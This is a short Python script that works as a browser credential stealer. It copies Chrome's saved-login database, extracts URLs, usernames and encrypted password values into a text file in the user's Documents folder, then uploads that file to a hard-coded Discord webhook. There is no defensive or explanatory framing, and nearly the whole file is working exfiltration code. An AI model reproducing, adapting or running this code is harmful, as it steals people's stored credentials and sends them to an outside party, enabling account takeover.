import os
import json
import sqlite3
import base64
import shutil
import requests

def send_to_discord(filepath):
    url = "https://discord.com/api/webhooks/1360942792540684438/8GkVbhnI8fPO6c8yeYN59KLuNAvCem_-50Bef334UkPn_gMrYMA0DWd3RxyliUPq6R8L"
    with open(filepath, 'rb') as f:
        files = {'file': (os.path.basename(filepath), f)}
        requests.post(url, files=files)

def extract_chrome_passwords(output_file):
    try:
        login_db = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
        temp_db = os.path.join(os.getenv("TEMP"), "LoginData.db")
        shutil.copy2(login_db, temp_db)

        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        results = cursor.fetchall()

        with open(output_file, 'w', encoding='utf-8') as f:
            for url, username, password in results:
                f.write(f"URL: {url}\nUser: {username}\nPassword (encrypted): {base64.b64encode(password).decode()}\n\n")

        cursor.close()
        conn.close()
        os.remove(temp_db)

    except Exception as e:
        with open(output_file, 'w') as f:
            f.write(f"Error: {str(e)}\n")

if __name__ == '__main__':
    output_path = os.path.join(os.path.expanduser('~'), 'Documents', 'chrome_passwords.txt')
    extract_chrome_passwords(output_path)
    send_to_discord(output_path)
